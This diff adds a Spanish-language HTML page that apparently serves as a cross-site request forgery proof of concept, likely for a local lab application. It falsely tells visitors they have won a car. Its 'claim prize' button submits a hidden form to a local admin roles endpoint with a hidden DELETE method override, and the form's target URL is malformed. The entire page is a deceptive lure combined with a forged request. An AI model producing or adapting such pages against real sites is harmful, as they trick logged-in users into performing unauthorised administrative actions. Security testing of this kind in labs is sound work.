@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>¡Felicidades! ¡Ganaste!</title>
+</head>
+<body style="text-align: center; font-family: Arial, sans-serif; background-color: #f0f0f0; padding: 50px;">
+    <h1>¡Felicidades! ¡Ganaste un coche!</h1>
+    <p>Haz click en el botón para reclamar tu premio.</p>
+
+    <form action="http://http://127.0.0.1:8000/admin/roles/create" method="POST">
+        <input type="hidden" name="_method" value="DELETE">
+        <button type="submit" style="
+            background: green;
+            color: white;
+            padding: 15px 30px;
+            font-size: 20px;
+            cursor:pointer;
+            "
+            >Reclamar premio</button>
+    </form>
+
+</body>
+</html>
